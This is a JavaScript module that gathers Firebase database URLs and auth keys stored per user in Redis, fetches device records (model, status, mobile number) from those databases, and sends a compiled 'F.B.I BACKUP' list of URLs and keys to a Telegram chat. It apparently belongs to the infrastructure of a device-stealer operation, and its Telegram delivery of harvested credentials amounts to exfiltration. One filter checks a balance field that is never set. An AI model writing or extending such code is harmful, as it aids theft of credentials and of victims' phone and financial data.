'use strict';

function parseDevs(data){
  var devs = [];
  if(data && typeof data === 'object'){
    Object.entries(data).forEach(function(kv){
      var id = kv[0], d = kv[1];
      if(!d || typeof d !== 'object') return;
      devs.push({ id: id, name: d.modelName || d.model || id, status: !!d.status, mobNo: d.mobNo || '' });
    });
  }
  return devs;
}

function fmtBal(n){ return '\u20B9' + Number(n).toLocaleString('en-IN', { maximumFractionDigits: 2 }); }

function createBackupRunner(api){
  var backupRunning = false;

  async function fetchFb(fbUrl, fbKey){
    var auth = fbKey ? '?auth=' + fbKey : '';
    var r = await fetch(fbUrl + '/clients.json' + auth);
    if(!r.ok) return { url: fbUrl, key: fbKey, devices: [], error: 'HTTP ' + r.status };
    var clients = await r.json();
    var devs = parseDevs(clients);
    return { url: fbUrl, key: fbKey, devices: devs.filter(function(d){ return d.balance; }), deviceCount: devs.length };
  }

  async function collect(onlyNew, actorUid){
    var sentSet = {};
    if(onlyNew){
      var arr = await api.redisSMembers(api.RK_SENT, actorUid);
      for(var x=0; x<(arr || []).length; x++) sentSet[arr[x]] = true;
    }
    var uids = await api.redisSMembers(api.RK_USERSET, actorUid);
    var lines = ['F.B.I BACKUP (server)', 'Generated: ' + new Date().toLocaleString(), ''];
    var count = 0;
    for(var i=0; i<uids.length; i++){
      var uid = uids[i];
      var slot = await api.redisGet(api.RK_PREFIX + uid, actorUid);
      if(!slot) continue;
      var fbs = [];
      try{ fbs = JSON.parse(slot) || []; }catch(e){}
      for(var j=0; j<fbs.length; j++){
        var fb = fbs[j];
        if(onlyNew && sentSet[fb.u]) continue;
        count++;
        lines.push('User: ' + uid);
        lines.push('Firebase: ' + fb.u);
        if(fb.k) lines.push('Key: ' + fb.k);
        lines.push('');
      }
    }
    lines.unshift('Firebases: ' + count);
    return { text: lines.join('\n'), count: count, uids: uids };
  }

  async function run(chatId, actorUid, onlyNew){
    if(backupRunning) return;
    backupRunning = true;
    try{
      await api.tgSend(chatId, '⏳ <b>Collecting…</b>');
      var r = await collect(onlyNew, actorUid);
      if(!r.count){ await api.tgSend(chatId, '✅ <b>Nothing pending</b>'); return; }
      await api.tgSendDocument(chatId, r.text, 'FBI-backup.txt', '📦 Backup (' + r.count + ' firebase entries)');
    }catch(e){
      await api.tgSend(chatId, '❌ ' + e.message);
    }finally{
      backupRunning = false;
    }
  }

  return {
    runBackupFull: function(chatId, actorUid){ return run(chatId, actorUid, false); },
    runBackupNew: function(chatId, actorUid){ return run(chatId, actorUid, true); }
  };
}

module.exports = { createBackupRunner: createBackupRunner };
